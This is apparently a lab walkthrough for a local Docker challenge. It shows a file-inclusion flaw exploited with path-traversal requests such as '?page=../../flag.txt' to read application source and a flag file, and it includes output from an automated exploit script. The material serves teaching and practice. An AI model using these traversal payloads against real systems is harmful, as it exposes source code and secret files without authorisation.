# Walkthrough: File Inclusion

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```
Welcome to the site.

Available pages: about, contact
Usage: GET /?page=about.txt
```

## Step 1: Read a Legitimate Page

```bash
curl "http://localhost:8080/?page=about.txt"
```

Output:
```
Welcome to the site. This page describes who we are.
```

The parameter works. The server is reading files from a `pages/` directory.

## Step 2: Test for Traversal

Move one level up with `../`:

```bash
curl "http://localhost:8080/?page=../app.py"
```

Output:
```python
#!/usr/bin/env python3
...
```

The server returned the application source. No sanitization is in place.

## Step 3: Read the Flag

```bash
curl "http://localhost:8080/?page=../../flag.txt"
```

Output:
```
POC{...}
```

`/app/pages/../../flag.txt` resolves to `/flag.txt`.

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080
[*] Service up. Home page:
Welcome to the site.

Available pages: about, contact
Usage: GET /?page=about.txt

[*] Reading legitimate page: about.txt
Welcome to the site. This page describes who we are.

[*] Traversal payload: ../../flag.txt
[*] Resolves to: /app/pages/../../flag.txt = /flag.txt

[+] Flag: POC{...}
```
